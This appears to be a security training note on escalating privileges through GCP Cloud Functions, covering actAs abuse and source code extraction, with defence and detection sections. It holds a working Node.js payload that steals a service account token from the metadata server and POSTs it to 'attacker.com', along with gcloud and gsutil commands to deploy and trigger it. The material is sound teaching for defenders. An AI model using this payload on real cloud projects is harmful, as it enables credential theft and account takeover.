---
tags: [cloud, gcp, cloud-functions, privesc, serverless]
difficulty: intermediate
module: "37 - Cloud Infrastructure"
topic: "37.16 GCP Cloud Functions"
---

# GCP Cloud Functions — Privilege Escalation

Google Cloud Functions is a serverless execution environment that allows developers to run single-purpose code in response to events. Because Cloud Functions run autonomously and interact closely with other Google Cloud Platform (GCP) services (like Cloud Storage, Pub/Sub, and Firestore), they rely heavily on Service Accounts for identity and authorization. This reliance makes Cloud Functions a prime target for Privilege Escalation, specifically through the abuse of overly permissive service accounts, source code modification, and `actAs` delegation logic.

## 1. Architectural Deep Dive

Cloud Functions operate in a fully managed environment. When a function is triggered, GCP provisions a lightweight, temporary execution environment (container), injects the function's code, and supplies the necessary environment variables and credentials.

### Identity in Cloud Functions

Every Cloud Function executes under the identity of an attached Service Account. By default, if a developer does not specify a custom service account, the function uses the **App Engine default service account** (`[PROJECT_ID]@appspot.gserviceaccount.com`). Historically, this default account was granted the `Editor` role on the entire project, which violates the principle of least privilege and is a massive security risk.

### ASCII Architecture Diagram

```text
+-------------------------------------------------------------+
|                     Attacker / User                         |
|  [IAM Role: roles/cloudfunctions.developer]                 |
|  [IAM Role: roles/iam.serviceAccountUser]                   |
+------------------------------+------------------------------+
                               |
                               | (1) Updates Function Code
                               v
+-------------------------------------------------------------+
|                 Google Cloud Functions API                  |
|                                                             |
|  Function: 'ProcessData'                                    |
|  Attached SA: 'high-priv-sa@project.iam.gserviceaccount.com'|
+------------------------------+------------------------------+
                               |
                               | (2) Triggers Execution
                               v
+----------------=============================----------------+
|                | Serverless Execution Env  |                |
|                | (Code Execution Context)  |                |
|                |                           |                |
|                | 1. Runs Attacker's Code   |                |
|                | 2. Queries Metadata       |                |
|                | 3. Obtains OAuth Token    |                |
|                +===========================+                |
+------------------------------+------------------------------+
                               |
                               | (3) Authenticated API Calls
                               v
+-------------------------------------------------------------+
|                    GCP Resource APIs                        |
| (Compute Engine, IAM, Secrets Manager, Cloud Storage)       |
| -> Action performed AS 'high-priv-sa'                       |
+-------------------------------------------------------------+
```

## 2. Privilege Escalation Vector: The `actAs` Permission

The core mechanism for privilege escalation via Cloud Functions revolves around the `iam.serviceAccounts.actAs` permission (often granted via the `roles/iam.serviceAccountUser` role).

### The Concept

In GCP, to deploy or modify a compute resource (like a Cloud Function) that runs as a specific Service Account, the deploying user MUST have the `actAs` permission on that target Service Account. This prevents a low-privileged developer from deploying a function attached to the `Project Owner` service account and effectively escalating their privileges.

However, misconfigurations frequently occur. If an attacker has:
1.  Permission to update or create a Cloud Function (`cloudfunctions.functions.update` or `create`).
2.  The `actAs` permission on a highly privileged Service Account.

They can deploy a malicious Cloud Function running as that privileged Service Account, trigger it, and execute arbitrary commands or API calls under that elevated identity.

### 3. Exploitation Methodology

Let's walk through a practical scenario where an attacker compromises a developer's credentials. The developer has limited access but can modify Cloud Functions and has `Service Account User` rights over a deployment service account.

#### Step 1: Enumeration

First, the attacker enumerates existing Cloud Functions to find targets.

```bash
gcloud functions list --project=target-project-123
```

Output:
```text
NAME             STATE   TRIGGER        REGION        RUNTIME
process-logs     ACTIVE  HTTP Trigger   us-central1   nodejs18
generate-report  ACTIVE  Event Trigger  us-central1   python39
```

The attacker describes the function to identify the attached Service Account:

```bash
gcloud functions describe process-logs --region=us-central1
```

Look for the `serviceAccountEmail` field. If it's a privileged account (e.g., one used for Terraform deployments or data lake management), the attacker proceeds.

#### Step 2: Preparing the Malicious Payload

The attacker creates a malicious version of the function. The goal is to make the function execute shell commands to query the metadata server, steal the token of the attached Service Account, and send it to an attacker-controlled server.

**Example Malicious Node.js Payload (`index.js`):**

```javascript
const { exec } = require('child_process');
const http = require('http');

exports.processLogs = (req, res) => {
    // 1. Fetch the token from the Metadata Server
    exec('curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"', (error, stdout, stderr) => {
        if (error) {
            res.status(500).send("Error");
            return;
        }

        // 2. Exfiltrate the token to the attacker's server
        const tokenData = stdout;
        const options = {
            hostname: 'attacker.com',
            port: 80,
            path: '/exfil',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': tokenData.length
            }
        };

        const exfilReq = http.request(options, (exfilRes) => {
            res.status(200).send("Execution Complete");
        });

        exfilReq.write(tokenData);
        exfilReq.end();
    });
};
```

#### Step 3: Deploying the Payload

The attacker deploys the malicious code to overwrite the existing function.

```bash
gcloud functions deploy process-logs \
  --region=us-central1 \
  --source=./malicious-code-dir/ \
  --entry-point=processLogs \
  --runtime=nodejs18 \
  --trigger-http
```
*Note: The attacker does not need to specify `--service-account` if they are updating an existing function; it inherits the already attached service account.*

#### Step 4: Triggering the Execution

If it's an HTTP-triggered function, the attacker simply visits the URL.

```bash
curl https://us-central1-target-project-123.cloudfunctions.net/process-logs
```

If it's an event-triggered function (e.g., Pub/Sub), the attacker must publish a dummy message to the corresponding topic to trigger the execution.

#### Step 5: Utilizing the Stolen Credentials

The attacker receives the OAuth token on their server. They validate its privileges and use it to escalate their access within the GCP environment, assuming the permissions of the high-privileged Service Account.

## 4. Alternate Vector: Source Code Extraction

If the attacker has `cloudfunctions.functions.sourceCodeGet` but *cannot* modify the function, they can still extract sensitive information.

Developers frequently hardcode secrets, API keys, or database credentials directly into the function's source code or its environment variables.

**Extracting Environment Variables:**
```bash
gcloud functions describe process-logs --region=us-central1 --format="yaml(environmentVariables)"
```

**Downloading the Source Code:**
The function code is stored in Cloud Storage. The attacker can get the URL to download a ZIP file of the source:

```bash
gcloud functions describe process-logs --region=us-central1 --format="value(sourceArchiveUrl)"
# Then download the zip from the gs:// bucket
gsutil cp gs://[BUCKET_NAME]/[OBJECT_NAME].zip .
unzip [OBJECT_NAME].zip
cat .env
cat config.json
```

## 5. Defense and Remediation

Securing Cloud Functions requires strict IAM hygiene and secure development lifecycle practices.

1.  **Strict `actAs` Control**: The `roles/iam.serviceAccountUser` role should be guarded fiercely. Never grant it broadly at the project level. Grant it only on the specific service accounts a developer absolutely needs to use, and only to authorized deployment pipelines.
2.  **Abolish Default Service Accounts**: Never use the App Engine default service account (`@appspot.gserviceaccount.com`). Create a bespoke custom service account for *every* Cloud Function.
3.  **Principle of Least Privilege (PoLP)**: The custom service account attached to a function should only have the exact IAM roles required to perform its task. If a function only writes to a specific Firestore collection, it should not have project-wide Viewer or Editor roles.
4.  **Secrets Management**: Never hardcode secrets in source code or environment variables. Use **Google Cloud Secret Manager**. Grant the function's service account the `roles/secretmanager.secretAccessor` role only for the specific secrets it needs.
5.  **Audit Code Modifications**: Implement CI/CD pipelines. Block manual deployment of Cloud Functions via `gcloud` from developer laptops. Enforce that all code changes go through version control, code review, and automated testing before being deployed by a secure service account pipeline.

## 6. Forensics and Detection

*   **Cloud Audit Logs (Admin Activity)**: Monitor for `google.cloud.functions.v1.CloudFunctionsService.UpdateFunction` and `CreateFunction` events. Unscheduled or out-of-band updates, especially outside of CI/CD IP ranges, are highly suspicious.
*   **VPC Service Controls**: Place Cloud Functions within VPC perimeters to prevent the exfiltration of tokens to external IP addresses.
*   **Log Sinks**: Route function execution logs to Cloud Logging and search for anomalous outbound connections or shell command executions if application-level logging is verbose enough.

## Chaining Opportunities

*   **[[15 - GCP Metadata Server — Credential Theft]]**: The core technique used *within* the malicious Cloud Function to steal the identity token.
*   **[[17 - GCP Compute Engine — Default Service Account Abuse]]**: Similar conceptual abuse, applying the risks of default service accounts to a different compute environment.
*   **[[25 - Secret Manager Extraction]]**: If the function's attached service account has Secret Manager access, the attacker can use the stolen token to dump all organizational secrets.

## Related Notes

*   [[10 - Serverless Security Risks]] - Broad overview of risks in AWS Lambda, Azure Functions, and GCP Cloud Functions.
*   [[09 - IAM Privilege Escalation Fundamentals]] - Deep dive into `actAs` and `PassRole` mechanics across cloud providers.
